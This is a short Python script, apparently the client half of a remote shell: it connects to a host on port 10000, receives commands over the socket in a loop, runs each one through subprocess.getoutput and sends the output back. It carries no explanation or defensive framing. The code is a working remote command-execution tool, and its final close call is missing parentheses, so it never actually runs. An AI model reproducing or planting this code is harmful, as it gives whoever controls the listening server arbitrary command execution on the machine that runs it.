import socket
import subprocess

sock = socket.socket()

host = "0.0.0.0"
port = 10000

sock.connect((host, port))
message = sock.recv(1024).decode()
print(message)

while True:
    command = sock.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    sock.send(output.encode())
sock.close